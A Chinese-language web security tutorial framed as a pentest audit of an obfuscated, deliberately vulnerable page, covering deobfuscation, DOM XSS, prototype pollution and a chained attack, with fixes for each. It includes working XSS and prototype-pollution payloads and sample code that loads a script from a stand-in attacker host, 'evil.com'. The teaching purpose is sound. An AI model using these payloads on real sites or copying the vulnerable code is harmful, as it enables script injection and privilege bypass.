# 1.任务背景：拿到一份混淆的页面代码
一个渗透测试任务——客户给了你「会员中心」页面的前端代码，让你审计有没有漏洞。但代码被轻度混淆过，直接看是一团乱码。你的任务是：还原代码 → 找漏洞 → 写 PoC（Proof of Concept，概念验证）→ 给修复方案。
## 1.1 三个技能回顾

| 技能         | 用来做什么                        |
| ---------- | ---------------------------- |
| AST 解混淆    | 还原被混淆的代码，看清变量名和字符串           |
| DOM XSS 审计 | 追踪 Source → Sink 数据流，发现注入点   |
| 原型链污染      | 	识别 Object.merge 类危险操作，构造污染链 |
## 1.2 审计流程总览
```
① 解混淆
用 AST 思路把 _0x 变量名和字符串数组还原，看清代码逻辑。

② 找 Sink
grep 出 innerHTML、eval、merge 等危险调用。

③ 回溯 Source
对每个 Sink 反向追踪数据来源，看是否来自可控输入。

④ 组合利用
判断多个漏洞能否串联——单个漏洞可能影响有限，串起来就是致命的。

⑤ 写修复方案
每个漏洞给「原理→条件→复现→修复」四段报告。
```
# 2.靶场代码：被混淆的「会员中心」
下面是客户给你的页面 JS 代码（已简化但保留了真实漏洞模式）。变量名被改成 \_0x 前缀，字符串藏进了数组。
```js
// ⭐ 这是「会员中心」页面的 JS（已混淆）
// 字符串藏在数组里，变量名是 _0x 前缀
var _0xarr = ['welcome', 'innerHTML', 'user', 'admin', 'merge', 'polluted', 'isAdmin', 'location', 'hash', 'substring', 'getElementById', 'greeting', 'config', 'endpoint', 'https://evil.com/steal', 'src'];

function _0xget(i) { return _0xarr[i]; }

function _0xmerge(target, source) {
  for (var key in source) {
    target[key] = source[key];
  }
  return target;
}

function _0xrender() {
  // 从 URL 读取用户名
  var name = _0xget(7)[_0xget(8)] ? _0xget(7)[_0xget(8)][_0xget(9)](1) : _0xget(2);
  // 写入欢迎语
  document[_0xget(10)](_0xget(11))[_0xget(1)] = _0xget(0) + ', ' + name;
  // 读取用户配置
  var cfg = {};
  _0xmerge(cfg, _0xget(2));   // 注意这里
  // 如果是管理员，外发数据
  if (cfg[_0xget(6)]) {
    var s = document['createElement']('script');
    s[_0xget(15)] = cfg[_0xget(13)] || _0xget(14);
    document['body']['appendChild'](s);
  }
}
_0xrender();
```

## 2.1 解混淆思路

| 混淆方式  | 这里怎么用的                            | 解法                               |
| ----- | --------------------------------- | -------------------------------- |
| 字符串数组 | 所有字符串字面量塞进 \_0xarr，用 \_0xget(i) 取 | AST 遍历所有 \_0xget(数字) 调用，替换成实际字符串 |
| 变量名混淆 | 函数和变量名都改成 \_0x 前缀                 | 根据语义手动改名（自动化较难，需人工判断）            |
解混淆后的代码：
```js
var _strArr = ['welcome','innerHTML','user','admin','merge','polluted',
               'isAdmin','location','hash','substring','getElementById',
               'greeting','config','endpoint',
               'https://evil.com/steal','src'];

function merge(target, source) {
  for (var key in source) { target[key] = source[key]; }
  return target;
}

function render() {
  var name = location.hash ? location.hash.substring(1) : 'user';
  document.getElementById('greeting').innerHTML = 'welcome, ' + name;   // ⭐ Sink 1
  var cfg = {};
  merge(cfg, user);                       // ⭐ Sink 2：user 是全局变量
  if (cfg.isAdmin) {                      // ⭐ Sink 3：原型链污染目标
    var s = document.createElement('script');
    s.src = cfg.endpoint || 'https://evil.com/steal';   // ⭐ Sink 4
    document.body.appendChild(s);
  }
}
render();
```

> [!important]  **解混淆后的第一直觉**：看到四个危险信号
> 1. `innerHTML = 'welcome, ' + name，`且 `name` 来自 `location.hash` → DOM XSS 嫌疑
> 2. `merge(cfg, user)`，`merge` 用 `for...in` 且不过滤 `__proto__` → 原型链污染嫌疑
> 3. `cfg.isAdmin` 被当成「是否管理员」判据 → 如果原型被污染，这里会误判
> 4. `document.createElement('script')` + 外部 URL → 脚本注入嫌疑

# 3.漏洞一：DOM XSS（location.hash → innerHTML）
| 维度  | 说明                                                                                                        |
| --- | --------------------------------------------------------------------------------------------------------- |
| 原理  | Source（`location.hash`）的数据未经净化直接拼进字符串，赋给 Sink（`innerHTML`）。浏览器把数据当 HTML 解析，攻击者可注入 `<img onerror>` 等事件处理器。 |
| 条件  | ① URL 含 `#` 锚点；② 锚点内容含 HTML 标签；③ 中间无转义。                                                                   |
| 复现  | 访问 `page.html#<img src=x onerror=alert(1)>`，弹窗即复现。                                                        |
| 修复  | 纯文本场景用 `textContent`；如需富文本用 `DOMPurify.sanitize()`。                                                       |
# 4.漏洞二：原型链污染（merge 不过滤 \__proto\__）
## 4.1 危险的 merge 函数
解混淆后这段代码是核心隐患：
```js
function merge(target, source) {
  for (var key in source) {
    target[key] = source[key];   // ⭐ 没有 hasOwnProperty 过滤，也没有拦截 __proto__
  }
  return target;
}

var cfg = {};
merge(cfg, user);                 // user 来自全局，可能是用户可控的 JSON
if (cfg.isAdmin) { ... }
```
## 4.2 原理 → 条件 → 复现 → 修复

| 维度  | 说明                                                                                                                                                      |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 原理  | merge 对 \__proto\__ 键无防护，target.\__proto\__ = source.\__proto\__ 会改写 target 的原型。若 target 是普通对象，就污染了 Object.prototype。                                   |
| 条件  | ① 存在递归/非递归 merge 类操作；② 不过滤 \__proto\__/constructor/prototype；③ source 数据攻击者可控（如 JSON 请求体）。                                                              |
| 复现  | 提交 {"\__proto\__":{"isAdmin":true}}，之后任何 ({}).isAdmin 都返回 true。                                                                                         |
| 修复  | ① 过滤危险键：if (key \=== '\__proto\__' \|\| key \=== 'constructor' \|\| key \=== 'prototype') continue;；② 用 Object.create(null) 创建无原型的对象；③ 用 Map 替代普通对象存键值。 |
# 5.三链合击：组合利用⭐
## 5.1 攻击链设计
**步骤 ①：原型链污染**
攻击者通过某个接收 JSON 的接口（比如「更新资料」）提交 `{"__proto__":{"isAdmin":true,"endpoint":"https://evil.com/x.js"}}`，污染 Object.prototype。

**步骤 ②：触发漏洞代码路径**
受害者访问「会员中心」页面，render() 执行。因为原型被污染，cfg.isAdmin 为 true，进入管理员分支。

**步骤 ③：脚本注入**
页面执行 document.createElement('script'); s.src = cfg.endpoint。由于 cfg.endpoint 也被污染成攻击者域名，恶意脚本被注入。

**步骤 ④：DOM XSS 兜底（可选）**
即使脚本注入被 CSP 拦截，攻击者还可以用 DOM XSS（漏洞一）作为备用入口——发一个 `#<img onerror=...>` 链接给受害者。
## 5.2 为什么串起来危害指数级上升

| 单独看     | 危害                    | 串起来     | 危害                     |
| ------- | --------------------- | ------- | ---------------------- |
| DOM XSS | 🟡 弹窗、偷 Cookie（需诱导点击） | + 原型链污染 | 🔴 持久化、绕过权限检查、自动触发脚本注入 |
| 原型链污染   | 🟡 改布尔值、绕过 isAdmin 检查 | + 脚本注入  | 🔴 任意 JS 执行（加载外部恶意脚本）  |
| 解混淆     | 🟢 审计辅助技能             | + 上述两个  | 🔴 让隐藏在混淆中的漏洞无所遁形      |
# 6.修复方案：三处都要补
审计报告的修复部分，按漏洞逐个给方案：

| 漏洞        | 原代码                                                      | 修复方案                                                                                           |
| --------- | -------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| ① DOM XSS | el.innerHTML = 'welcome, ' + name                        | 改用 el.textContent = 'welcome, ' + name（纯文本场景）                                                  |
| ② 原型链污染   | `for (var key in source) { target[key] = source[key]; }` | `过滤危险键：if (key === '__proto__' \|\| key === 'constructor' \|\| key === 'prototype') continue;` |
| ③ 脚本注入    | s.src = cfg.endpoint \|\| 'https\://evil.com/steal'      | `① 白名单校验 URL 协议和域名；② 删除硬编码的 evil.com 默认值；③ 加 CSP：script-src 'self'`                            |
| ④ 纵深防御    | —                                                        | `给页面加 CSP 头：Content-Security-P: script-src 'self'; object-src 'none'，即使代码漏了也能挡住外域脚本`           |

> [!important]  修复不要只补一处
> 新手常犯的错误是「我把 innerHTML 改成 textContent 就行了」——不行。原型链污染还在，攻击者照样能绕过 isAdmin 检查触发脚本注入。**三个漏洞都要补，再加 CSP 兜底**。安全是纵深防御，不是补丁游戏。

# 7.核心要点

| 概念         | 一句话                                             |
| ---------- | ----------------------------------------------- |
| 审计流程       | 解混淆 → 找 Sink → 回溯 Source → 组合利用 → 写修复           |
| ⭐ 串联思维     | 单个漏洞常被低估，问自己「能和别的漏洞串起来吗？」                       |
| DOM XSS 修复 | 纯文本用 textContent，富文本用 DOMPurify                 |
| 原型链污染修复    | merge 里过滤 `__proto__`/`constructor`/`prototype` |
| 脚本注入修复     | URL 白名单校验 + 删硬编码 evil 默认值 + CSP                 |
| 纵深防御       | 三处漏洞都补 + CSP 兜底，不是补丁游戏                          |
